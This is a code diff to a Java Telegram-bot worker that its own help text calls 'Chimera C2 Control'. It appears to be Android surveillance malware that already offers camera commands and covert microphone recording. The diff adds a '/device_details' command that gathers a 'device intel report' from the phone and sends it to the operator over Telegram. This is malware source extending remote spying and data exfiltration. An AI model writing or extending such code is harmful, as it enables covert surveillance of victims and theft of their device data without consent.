@@ -129,6 +129,10 @@ public class TelegramBotWorker implements Runnable {
                         }
                     });
                     break;
+                case "/device_details":
+                    sendMessage("Gathering device intelligence...", context);
+                    DeviceDetailsHelper.getDeviceDetails(context, details -> sendMessage(details, context));
+                    break;
             }
         } catch (Exception e) {
             ErrorLogger.logError(context, "TelegramBotWorker_HandleMessage", e);
@@ -161,9 +165,10 @@ public class TelegramBotWorker implements Runnable {
 
     private void sendHelpMessage(long chatId) {
         String helpText = "Chimera C2 Control\n\n"
-                        + "/command - Show camera command menu.\n"
-                        + "/mic <seconds> - Record audio (e.g., /mic 60).\n"
-                        + "/help - Show this message.";
+                + "/command - Show camera command menu.\n"
+                + "/mic <seconds> - Record audio (e.g., /mic 60).\n"
+                + "/device_details - Get full device intel report.\n"
+                + "/help - Show this message.";
         sendMessage(helpText, context);
     }
 
